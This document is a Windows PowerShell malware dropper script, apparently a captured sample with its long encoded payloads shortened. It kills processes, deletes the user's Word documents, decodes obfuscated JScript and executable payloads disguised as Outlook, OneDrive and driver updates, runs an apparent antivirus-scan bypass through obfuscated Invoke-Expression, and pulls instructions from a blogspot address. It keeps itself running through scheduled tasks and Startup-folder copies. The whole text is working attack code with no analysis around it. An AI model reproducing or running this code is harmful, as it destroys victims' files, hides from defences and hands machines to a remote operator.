Stop-Process -Name "powerpnt" -ErrorAction SilentlyContinue
start-sleep 3
$path = 'C:\Users\*\Downloads\*.docx'
$path2 = 'C:\Users\*\Desktop\*.docx'
Remove-Item $path -force -recurse -ErrorAction SilentlyContinue
Remove-Item $path2 -force -recurse -ErrorAction SilentlyContinue
$acuniphynux = "C:\\ProgramData\\MegamindCypher"
New-Item $acuniphynux -ItemType Directory -Force
Function Cum {
    param($Pentagone)
    $Pentagone =  -join ($Pentagone -split '(..)' | ? { $_ } | % { [char][convert]::ToUInt32($_,16) })
    return $Pentagone
    }
$J1UAC = '-7-6-6-1-7-2-2-0-4-9-33434-4-1-...-7-2-63435-2-0-7-7-2-8-2-9-33432-73434'.replace('-','333') # NOTE: The actual 7734-character Base64 string omitted for readability.
$J2Main = '-6-6-7-5-63435-6--37-4-6...0-7-8--30-234-332-1-2-1-53432-53434-2-9-2-9-33432'.replace('-','333') # NOTE: The actual 6012-character Base64 string omitted for readability.
$T1 = $acuniphynux + "\\OutlookUpdate.js"
$T2 = $acuniphynux + "\\OneDriveUpdate.js"
$X1 = Cum(Cum(Cum $J1UAC))
$X2 = Cum(Cum(Cum $J2Main))
[IO.File]::WriteAllText($T1, $X1)
[IO.File]::WriteAllText($T2, $X2)
$WS = 'wscript.exe //b //e:jscript'
schtasks /create /sc MINUTE /mo 120 /tn MainChrome /F /tr "$WS $T2"
schtasks /create /sc MINUTE /mo 143 /tn ChromeUAC /F /tr "$WS $T1"
$Minugchapali = @'
try 
{
Stop-Process -Name "RegSvcs" -ErrorAction SilentlyContinue
Stop-Process -Name "msbuild" -ErrorAction SilentlyContinue
Stop-Process -Name "CasPol" -ErrorAction SilentlyContinue
Stop-Process -Name "jsc" -ErrorAction SilentlyContinue
Stop-Process -Name "aspnet_compiler" -ErrorAction SilentlyContinue
Stop-Process -Name "Winword" -ErrorAction SilentlyContinue
} catch { }
Function Cum {
    param($Pentagone)
    $Pentagone =  -join ($Pentagone -split '(..)' | ? { $_ } | % { [char][convert]::ToUInt32($_,16) })
    return $Pentagone
    }
$AntiCrisper = '4D5A9000030000000400...0000000000000000000000000' # NOTE: The actual 114688-character Base64 string omitted for readability.
$GORMAX32 = '46756E6374696F6E20414D53...65207B0A7D7D20456C7365207B0A7D' # NOTE: The actual 141018-character Base64 string omitted for readability.
$INTEL = $GORMAX32.replace('<','3333333').replace('>','444')
(Cum $INTEL)  | .('{x}{9}'.replace('9','0').replace('x','1')-f'lun','%%').replace('%%','I').replace('lun','EX')
'@
[IO.File]::WriteAllText("$acuniphynux\\CypherDeptography.~+~", $Minugchapali)
$Minugchapali | .('{x}{9}'.replace('9','0').replace('x','1')-f'lun','%%').replace('%%','I').replace('lun','EX')
$link = 'https://10figfgjf.blogspot.com/atom.xml'
$sim = '-7-6-6-1-7-2-2-0-7-0-33434-4-1-33432-2-8-6-6-7...63435-2-0-7-7-2-8-2-9-33432-73434'.replace('-','333') # NOTE: The actual 5866-character Base64 string omitted for readability.
$shemale = Cum(Cum(Cum $sim))
$sexi = $shemale.replace('stepsis',$link)
[IO.File]::WriteAllText("$acuniphynux\\Drivers.js", $sexi)
schtasks /create /sc MINUTE /mo 132 /tn Driversed /F /tr "$WS C:\\ProgramData\\MegamindCypher\\Drivers.js"
$startup = [environment]::getfolderpath("Startup")
[string]$sourceDirectory  = "C:\\ProgramData\\MegamindCypher\\*"
[string]$destinationDirectory = $startup
Copy-item -Force -Recurse -Verbose $sourceDirectory -Destination $destinationDirectory
Remove-Item "$destinationDirectory\*.~+~" -Force -recurse -ErrorAction SilentlyContinue
Remove-Item "$destinationDirectory\*.vbs" -Force -recurse -ErrorAction SilentlyContinue
Remove-Item "$destinationDirectory\*.exe" -Force -recurse -ErrorAction SilentlyContinue
